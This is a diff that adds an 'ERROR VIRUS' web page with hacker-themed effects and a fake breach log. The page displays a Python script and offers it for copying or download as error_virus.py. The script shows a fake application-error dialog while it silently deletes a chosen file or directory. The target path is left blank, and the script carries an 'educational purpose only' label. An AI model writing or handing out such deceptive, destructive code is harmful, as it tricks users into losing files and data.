@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ERROR VIRUS</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css" rel="stylesheet"/>
+    <style>
+        :where([class^="ri-"])::before { content: "\f3c2"; }
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+        @keyframes scanline {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        .scanline::after {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(to bottom, transparent 50%, rgba(255, 0, 51, 0.1) 50%);
+            background-size: 100% 4px;
+            pointer-events: none;
+        }
+        .glitch-text:hover {
+            animation: glitch 0.2s infinite;
+            text-shadow: 2px 2px #ff0033;
+        }
+        .terminal-cursor {
+            animation: blink 1s step-end infinite;
+        }
+        .code-container {
+            background: rgba(30, 30, 30, 0.9);
+            border: 1px solid #ff0033;
+            box-shadow: 0 0 10px #ff0033;
+        }
+        .system-log {
+            height: 200px;
+            overflow-y: auto;
+            font-family: 'Share Tech Mono', monospace;
+        }
+        .system-log::-webkit-scrollbar {
+            width: 4px;
+        }
+        .system-log::-webkit-scrollbar-track {
+            background: #1a1a1a;
+        }
+        .system-log::-webkit-scrollbar-thumb {
+            background: #ff0033;
+        }
+    </style>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#ff0033',
+                        secondary: '#1E1E1E'
+                    },
+                    borderRadius: {
+                        'none': '0px',
+                        'sm': '4px',
+                        DEFAULT: '8px',
+                        'md': '12px',
+                        'lg': '16px',
+                        'xl': '20px',
+                        '2xl': '24px',
+                        '3xl': '32px',
+                        'full': '9999px',
+                        'button': '8px'
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-black min-h-screen text-white font-['Share_Tech_Mono'] relative overflow-x-hidden">
+    <div class="scanline fixed inset-0 pointer-events-none"></div>
+    
+    <div class="container mx-auto px-4 py-8">
+        <h1 class="text-6xl text-center mb-12 glitch-text font-bold tracking-wider text-primary">ERROR VIRUS</h1>
+        
+        <div class="code-container rounded p-6 mb-8 relative">
+            <button class="absolute top-4 right-4 hover:text-primary transition-colors" id="copyBtn">
+                <i class="ri-clipboard-line ri-lg"></i>
+            </button>
+            <pre id="codeDisplay" class="text-sm whitespace-pre-wrap"></pre>
+            <span class="terminal-cursor text-primary">█</span>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mb-8">
+            <div class="system-log bg-secondary rounded p-4" id="systemLog">
+            </div>
+            
+            <div class="flex flex-col items-center justify-center bg-secondary rounded p-4">
+                <div class="text-2xl mb-2" id="countdown">05:00</div>
+                <div class="text-primary animate-pulse">BREACH IN PROGRESS</div>
+            </div>
+        </div>
+
+        <div class="text-center">
+            <button id="downloadBtn" class="bg-primary text-white px-8 py-4 rounded-button text-xl hover:animate-pulse transition-all">
+                DOWNLOAD PAYLOAD
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const maliciousCode = `import tkinter as tk
+from tkinter import messagebox
+import os
+import shutil
+
+##################################
+#    Educational Purpose Only    #
+##################################
+
+def delete_target(path):
+    """
+    Deletes the specified file or folder without any output, showing an error message box.
+    """
+    if os.path.exists(path):
+        try:
+            if os.path.isfile(path):
+                os.remove(path)
+            elif os.path.isdir(path):
+                shutil.rmtree(path)
+        except Exception:
+            pass
+
+def show_error_and_delete():
+    error_message = (
+        "Application Error\n\n"
+        "The program could not be opened due to an unexpected error.\n"
+        "An error occurred during the initialization process, and the application was unable to start properly.\n\n"
+    )
+
+    messagebox.showerror("Application Error", error_message)
+    
+    target_path = r""
+    
+    delete_target(target_path)
+
+if __name__ == '__main__':
+    root = tk.Tk()
+    root.withdraw()
+    show_error_and_delete()`;
+
+        const systemMessages = [
+            "Initializing system breach...",
+            "Bypassing firewall...",
+            "Accessing main framework...",
+            "Injecting payload...",
+            "Corrupting system files...",
+            "Encrypting user data...",
+            "Establishing backdoor connection...",
+            "Deploying rootkit...",
+            "System compromise at 25%...",
+            "System compromise at 50%...",
+            "System compromise at 75%...",
+            "Final stage initiated..."
+        ];
+
+        let currentIndex = 0;
+        const codeDisplay = document.getElementById('codeDisplay');
+        const systemLog = document.getElementById('systemLog');
+        const countdownEl = document.getElementById('countdown');
+        function typeCode() {
+            if (currentIndex < maliciousCode.length) {
+                codeDisplay.textContent += maliciousCode[currentIndex];
+                currentIndex++;
+                setTimeout(typeCode, 50);
+            }
+        }
+
+        function updateSystemLog() {
+            const message = systemMessages[Math.floor(Math.random() * systemMessages.length)];
+            const timestamp = new Date().toLocaleTimeString();
+            const logEntry = document.createElement('div');
+            logEntry.className = 'mb-2';
+            logEntry.innerHTML = `[${timestamp}] ${message}`;
+            systemLog.appendChild(logEntry);
+            systemLog.scrollTop = systemLog.scrollHeight;
+        }
+
+        function startCountdown() {
+            let time = 300;
+            const interval = setInterval(() => {
+                time--;
+                const minutes = Math.floor(time / 60);
+                const seconds = time % 60;
+                countdownEl.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                if (time <= 0) clearInterval(interval);
+            }, 1000);
+        }
+
+        document.getElementById('copyBtn').addEventListener('click', () => {
+            navigator.clipboard.writeText(maliciousCode);
+            const btn = document.getElementById('copyBtn');
+            btn.innerHTML = '<i class="ri-check-line ri-lg"></i>';
+            setTimeout(() => {
+                btn.innerHTML = '<i class="ri-clipboard-line ri-lg"></i>';
+            }, 2000);
+        });
+        document.getElementById('downloadBtn').addEventListener('click', () => {
+            const blob = new Blob([maliciousCode], {type: 'text/plain'});
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'error_virus.py';
+            document.body.appendChild(a);
+            a.click();
+            window.URL.revokeObjectURL(url);
+            document.body.removeChild(a);
+        });
+
+        typeCode();
+        startCountdown();
+        setInterval(updateSystemLog, 2000);
+    </script>
+</body>
+</html>
